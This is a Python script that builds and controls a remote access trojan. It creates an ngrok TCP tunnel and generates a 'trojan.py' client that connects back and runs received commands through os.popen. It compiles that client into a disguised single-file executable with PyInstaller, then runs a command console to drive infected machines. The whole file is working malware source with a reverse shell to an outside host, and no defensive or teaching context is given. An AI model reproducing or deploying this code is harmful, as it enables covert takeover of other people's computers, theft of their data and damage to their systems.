import socket 
from pyngrok import ngrok
import configparser
import PyInstaller.__main__
import os

server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
port=8080
host="127.0.0.1"
ssh,ssh_port=ngrok.connect(port,proto="tcp").replace('tcp://','').split(":")
script=f"""
import pyautogui
import socket
import configparser
import os 
host="{ssh}"
port={ssh_port}
print((host,port))
server=socket.socket()
server.connect((host,int(port)))
while True:
    msg=server.recv(1024)
    res=os.popen(msg.decode('UTF-8'))
    server.send(res.read(1024).encode('UTF-8'))
"""
with open("trojan.py",'w') as trojan:
    trojan.write(script)
PyInstaller.__main__.run([
    '--onefile',
    '--icon=wadog.ico',
    os.path.join('trojan.py')
    ])

server.bind((host,port))
server.listen(5)
client,addr=server.accept()

print("conection establishd",addr)
while True:
    try:
        command=input("$[WADOG]>>>")
        client.send(command.encode("UTF-8"))
        msg=client.recv(1024)
        print(msg.decode("UTF-8"))
    except ConnectionResetError:
        print('connection lost !!!')
        client,addr=server.accept()
        print("back to online!",addr)
